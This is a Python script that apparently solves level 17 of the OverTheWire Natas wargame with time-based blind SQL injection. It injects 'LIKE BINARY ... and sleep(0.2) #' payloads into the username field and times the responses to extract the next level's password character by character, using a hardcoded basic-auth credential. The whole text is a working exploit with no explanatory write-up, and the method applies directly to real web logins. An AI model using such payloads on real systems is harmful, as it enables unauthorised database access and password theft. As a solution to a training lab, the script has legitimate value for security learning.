import requests,string,time
from requests.auth import HTTPBasicAuth

uri = 'http://natas17.natas.labs.overthewire.org/index.php?debug'
chars = ''.join([string.ascii_letters,string.digits])
filtered = ''
passwd = ''

for char in chars:
    Data = {'username' : 'natas18" and password LIKE BINARY "%' + char + '%" and sleep(0.2) #'}
    start = time.time()
    r = requests.post(
            uri,
            auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),
            data = Data)
    end = time.time()
    duration = end - start
    if duration > 0.2:
        filtered = filtered + char
        print(filtered)

for i in range(0,32):
    for char in filtered:
        Data = {'username' : 'natas18" and password LIKE BINARY "' + passwd + char + '%" and sleep(0.2) #'}
        start = time.time()
        r = requests.post(
            uri,
            auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),
            data = Data)
        end = time.time()
        duration = end - start
        if duration > 0.2:
            passwd = passwd + char
            filtered = filtered + char
            print(passwd)
            break
